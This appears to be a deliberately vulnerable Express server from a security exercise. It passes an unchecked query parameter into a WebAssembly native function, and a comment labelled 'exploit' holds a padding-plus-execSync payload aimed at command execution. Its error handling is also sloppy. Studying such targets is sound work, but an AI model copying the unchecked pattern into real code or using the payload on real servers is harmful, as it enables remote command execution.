const Module = require('./wasm.js')
const express = require('express')
const app = express()
const port = 3000

var executeWasm;
  console.log("DEBUG");
  var result = Module.onRuntimeInitialized = () => {
  console.log("LOADED");
  executeWasm = function executeWasm(name) {
  const ptr = Module.allocate(
        Module.intArrayFromString(name),
        Module.ALLOC_NORMAL
    );
    //
   Module._greetings(ptr);

   Module._free(ptr);
   }
   }
   

app.get('/', (req, res) => {
// exploit AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAconst { execSync } = require('child_process');console.log(execSync('ls').toString());//
  let name = req.query.name
  if (name == undefined) {
	res.send("Insert your name");
  }
  executeWasm(name);
  res.send("Thank you for sending us your name"); 
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})






